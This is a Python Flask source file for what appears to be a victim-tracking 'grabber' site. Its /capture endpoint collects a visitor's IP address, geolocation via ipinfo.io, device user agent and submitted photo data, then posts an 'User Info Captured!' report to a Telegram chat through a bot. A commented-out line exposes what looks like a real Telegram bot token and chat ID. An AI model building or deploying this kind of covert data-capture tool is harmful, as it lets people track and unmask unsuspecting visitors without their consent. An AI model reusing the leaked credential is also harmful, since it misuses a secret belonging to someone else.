from flask import Flask, request, render_template, jsonify
import requests
import telebot
import base64
import os
from dotenv import load_dotenv

load_dotenv()  # Load environment variables from .env

TOKEN = os.getenv("TOKEN")
CHAT_ID = os.getenv("CHAT_ID")


# TOKEN = "7756384152:AAEpXocV1AfjgXBOpRE4vi-Q7WTTJWI6aW4"  # Replace with your Telegram bot token
# CHAT_ID = "1227177654"  # Replace with your Telegram Chat ID

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")  # Load the webpage

@app.route("/capture", methods=["POST"])
def capture():
    data = request.json
    
    # Get real IP address from request headers
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Fetch geolocation based on real IP
    ip_data = requests.get(f"https://ipinfo.io/{user_ip}/json").json()
    
    # Get other details
    photo_data = data.get("photo")
    user_agent = request.headers.get('User-Agent')

    # Prepare message
    message = f"🌐 **User Info Captured!**\n\n"
    message += f"🆔 IP: {ip_data.get('ip', 'N/A')}\n"
    message += f"📍 Location: {ip_data.get('city', 'Unknown')}, {ip_data.get('region', 'Unknown')}, {ip_data.get('country', 'Unknown')}\n"
    message += f"📱 Device: {user_agent}\n"

    bot.send_message(CHAT_ID, message)
    
    return jsonify({"message": "Data sent to Telegram"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
